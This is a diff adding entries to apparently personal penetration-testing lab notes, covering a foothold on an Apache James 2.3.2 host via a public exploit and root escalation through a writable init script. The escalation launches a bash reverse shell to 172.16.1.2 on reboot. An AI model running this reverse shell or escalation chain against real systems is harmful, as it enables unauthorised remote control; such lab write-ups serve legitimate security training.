@@ -55,3 +55,33 @@ Foothold -> Found Target is Windows XP and Open 445
 Exploit -> MS08-067 and MS17-010
 ```
 
+#### 10.11.1.95 (James)
+```bash
+Foothold -> Found Apache James Server 2.3.2
+Exploit -> Use Public Exploit from https://www.exploit-db.com/exploits/50347
+
+sudo -l
+(root) NOPASSWD: /sbin/reboot
+
+Found Can Edit /etc/init.d/james
+
+Escalate -> Edit /etc/init.d/james
+
+---/etc/init.d/james---
+#!/bin/bash
+sudo JAVA_HOME=/usr/lib/jvm/default-java /home/james/shell.sh
+-----------------------
+
+Escalate -> Create shell.sh
+---shell.sh---
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/172.16.1.2/80 0>&1
+--------------
+
+Escalate -> sudo /sbin/reboot
+```
+
+#### 10.11.1.109 (AS45)
+```bash
+
+```
